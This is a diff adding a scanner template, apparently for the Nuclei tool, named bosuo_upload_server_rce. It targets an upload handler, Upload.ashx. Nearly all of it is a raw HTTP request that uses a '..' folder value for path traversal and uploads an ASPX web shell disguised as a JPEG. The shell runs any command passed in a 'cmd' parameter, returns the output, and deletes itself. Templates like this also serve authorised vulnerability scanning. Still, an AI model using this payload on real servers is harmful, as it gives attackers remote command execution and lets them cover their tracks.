@@ -1,0 +1,66 @@
+id: bosuo_upload_server_rce
+info:
+  name: bosuo_upload_server_rce
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /WebUpload/server/Upload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1234567890
+        Connection: close
+        
+        ------WebKitFormBoundary1234567890
+        Content-Disposition: form-data; name="id"
+        
+        WU_FILE_0
+        ------WebKitFormBoundary1234567890
+        Content-Disposition: form-data; name="name"
+        
+        1.aspx
+        ------WebKitFormBoundary1234567890
+        Content-Disposition: form-data; name="size"
+        
+        10000
+        ------WebKitFormBoundary1234567890
+        Content-Disposition: form-data; name="type"
+        
+        image/jpeg
+        ------WebKitFormBoundary1234567890
+        Content-Disposition: form-data; name="OwnBaseFolder"
+        
+        ..
+        ------WebKitFormBoundary1234567890
+        Content-Disposition: form-data; name="file"; filename="1.jpg"
+        Content-Type: image/jpeg
+        
+        <%@ Page Language="Jscript" validateRequest="false" %>
+        <%
+        var c=new System.Diagnostics.ProcessStartInfo("cmd");
+        var e=new System.Diagnostics.Process();
+        var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+        c.UseShellExecute=false;
+        c.RedirectStandardOutput=true;
+        c.RedirectStandardError=true;
+        e.StartInfo=c;
+        c.Arguments="/c " + Request.Item["cmd"];
+        e.Start();
+        out=e.StandardOutput;
+        EI=e.StandardError;
+        e.Close();
+        Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+        System.IO.File.Delete(Request.PhysicalPath);
+        Response.End();%>
+        ------WebKitFormBoundary1234567890--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - jsonrpc
+          - VirtualUrl
+    matchers-condition: and
